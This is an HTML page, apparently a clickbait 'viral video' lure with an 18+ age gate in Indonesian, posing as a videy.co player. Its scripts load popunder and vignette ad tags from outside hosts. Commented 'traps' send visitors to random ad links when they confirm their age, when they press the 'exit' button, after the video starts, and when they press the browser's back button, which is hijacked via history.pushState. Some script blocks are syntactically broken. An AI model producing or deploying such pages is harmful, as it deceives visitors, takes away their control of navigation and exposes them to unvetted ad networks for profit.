<!DOCTYPE html>

<title>Video Viral</title>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: #f5f5f5;
}

/* AGE POPUP */
#agePopup {
    position: fixed;
    top:0;left:0;
    width:100%;height:100%;
    background: rgba(0,0,0,0.9);
    display:flex;
    justify-content:center;
    align-items:center;
    z-index:9999;
    color:#000;
}

.age-box {
    background:#fff;
    padding:20px;
    border-radius:12px;
    text-align:center;
    width:85%;
    max-width:320px;
}

.age-box button {
    margin-top:10px;
    padding:12px;
    border:none;
    border-radius:6px;
    width:100%;
    font-weight:bold;
}

.btn-yes {background:#000;color:#fff;}
.btn-no {background:#ccc;}

.header {
    display:flex;
    justify-content:space-between;
    padding:15px;
    background:#fff;
    font-weight:bold;
}

.video-box {
    margin:15px;
    border-radius:15px;
    overflow:hidden;
    position:relative;
}

video {width:100%;}

.overlay {
    position:absolute;
    top:0;left:0;right:0;bottom:0;
    display:flex;
    justify-content:center;
    align-items:center;
    background:rgba(0,0,0,0.3);
}

.play-btn {
    background:#fff;
    width:70px;height:70px;
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:30px;
}
</style>
</head>

<body>

<!-- AGE GATE -->
<div id="agePopup">
    <div class="age-box">
        <h3>Konfirmasi Usia</h3>
        <p>Konten ini hanya untuk 18+</p>

        <button class="btn-yes" onclick="enterSite()">Saya 18+</button>
        <button class="btn-no" onclick="goLink()">Keluar</button>
    </div>
</div>

<div class="header">
    <div>videy.co</div>
</div>

<div class="video-box">
    <video id="vid" src="https://cdn.videy.co/Fmm16v9f1.mp4"></video>

    <div class="overlay" onclick="playAndRedirect()">
        <div class="play-btn">▶</div>
    </div>
</div>

<!-- POPUNDER -->
<script>

    s.dataset.zone='10874906';
    s.src='https://al5sm.com/tag.min.js';
})(document.body.appendChild(document.createElement('script')));
</script>

<!-- VIGNETTE -->
<script>
(function(s){
    s.dataset.zone='10874900';
    s.src='https://n6wxm.com/vignette.min.js';

</script>

<script>
// 🔥 MULTI LINK (WAJIB)
let links = [
 "https://omg10.com/4/10874904",
 "https://omg10.com/4/10874905",
 "https://omg10.com/4/10874906"
];

function goLink(){
    let rand = links[Math.floor(Math.random()*links.length)];
    window.location.href = rand;
}

let clicked = false;
let ageConfirmed = false;

// 🔥 AGE TRAP + FAKE LOADING
function enterSite(){
    document.getElementById("agePopup").innerHTML = "<h3>Loading video...</h3>";

    setTimeout(() => {
        document.getElementById("agePopup").style.display = "none";
        ageConfirmed = true;
    }, 1500);

    // 🔥 AUTO CUAN
    setTimeout(() => {
        goLink();
    }, 2500);
}

// 🔥 VIDEO TRAP
function playAndRedirect(){
    if(!ageConfirmed) return;

    let v = document.getElementById("vid");

    if(!clicked){
        v.play();
        document.querySelector(".overlay").style.display="none";
        clicked = true;

        // 🔥 AUTO REDIRECT SETELAH PLAY
        setTimeout(() => {
            goLink();
        }, 4000);

    } else {
        goLink();
    }
}

// 🔥 BACK BUTTON TRAP
history.pushState(null, null, location.href);
window.onpopstate = function(){
    goLink();
};
</script>

</body>
